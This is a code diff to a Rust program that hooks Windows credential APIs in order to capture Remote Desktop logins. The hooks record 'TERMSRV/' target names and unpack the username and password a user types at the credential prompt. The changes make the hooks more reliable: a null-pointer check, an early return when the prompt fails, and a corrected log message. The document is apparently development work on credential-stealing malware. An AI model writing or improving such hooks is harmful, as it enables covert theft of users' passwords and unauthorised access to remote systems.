@@ -4,7 +4,7 @@ use std::{env::current_exe, ffi::c_void, mem::transmute, ptr::null_mut};
 use windows::{
     core::{PCSTR, PCWSTR, PWSTR},
     Win32::{
-        Foundation::{BOOL, HINSTANCE},
+        Foundation::{BOOL, ERROR_SUCCESS, HINSTANCE},
         Security::Credentials::{
             CredUnPackAuthenticationBufferW, CREDENTIALW, CREDUIWIN_FLAGS, CREDUI_INFOW,
             CREDUI_MAX_USERNAME_LENGTH, CRED_PACK_PROTECTED_CREDENTIALS, CRED_TYPE,
@@ -44,10 +44,12 @@ extern "C" fn cred_read_w_hook(
         credential: *mut *mut CREDENTIALW,
     ) -> BOOL = unsafe { transmute(ORIGINAL_CRED_READ_W as *const usize) };
 
-    if let Ok(value_name) = unsafe { targetname.to_string() } {
-        if value_name.starts_with("TERMSRV/") {
-            let mut mutex_termsrv = LAST_TERMSRV.lock().unwrap();
-            *mutex_termsrv = value_name.clone();
+    if !targetname.is_null() {
+        if let Ok(value_name) = unsafe { targetname.to_string() } {
+            if value_name.starts_with("TERMSRV/") {
+                let mut mutex_termsrv = LAST_TERMSRV.lock().unwrap();
+                *mutex_termsrv = value_name.clone();
+            }
         }
     }
 
@@ -93,6 +95,10 @@ extern "C" fn credui_prompt_for_windows_credentials_hook(
         dwflags,
     );
 
+    if ret_val != ERROR_SUCCESS.0 {
+        return ret_val;
+    }
+
     let mut username_size = CREDUI_MAX_USERNAME_LENGTH as u32;
     let mut username = vec![0 as u16; username_size as usize];
 
@@ -115,7 +121,7 @@ extern "C" fn credui_prompt_for_windows_credentials_hook(
             #[cfg(debug_assertions)]
             {
                 log_data(format!(
-                    "PID : {} - Failed CredUnpPackAuthenticationBufferW",
+                    "PID : {} - Failed CredUnPackAuthenticationBufferW",
                     process::id()
                 ));
             }
